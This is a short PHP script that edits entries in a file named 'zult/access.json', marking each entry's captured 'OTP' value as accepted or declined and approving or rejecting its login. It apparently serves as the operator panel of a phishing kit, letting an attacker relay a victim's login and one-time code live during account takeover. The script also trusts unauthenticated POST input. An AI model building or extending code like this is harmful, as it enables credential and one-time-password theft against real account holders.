<?php
	$out_dir = "./zult/access.json";
	$results = json_decode(file_get_contents($out_dir), true);
	if(strcmp($_POST['method'], "delete") == 0 ){
		echo 1;
		unset($results[$_POST['target']]);
	}else if(strcmp($_POST['method'], "accept") == 0){
		$results[$_POST['target']]['OTP'] = substr_replace($results[$_POST['target']]['OTP'], " Ok!" , 6 , 7);
	}else if(strcmp($_POST['method'], "decline") == 0){
		$results[$_POST['target']]['OTP'] = substr_replace($results[$_POST['target']]['OTP'], " Declined!" , 6, 7);
	}else if(strcmp($_POST['method'], "loginAccept") == 0){
		$results[$_POST['target']]['isAccepted'] = "yes";
	}else if(strcmp($_POST['method'], "loginDecline") == 0){
		$results[$_POST['target']]['isAccepted'] = "nono";
	}
	$fh = fopen($out_dir,"w");
	fwrite($fh, json_encode($results));
	fclose($fh);
?>
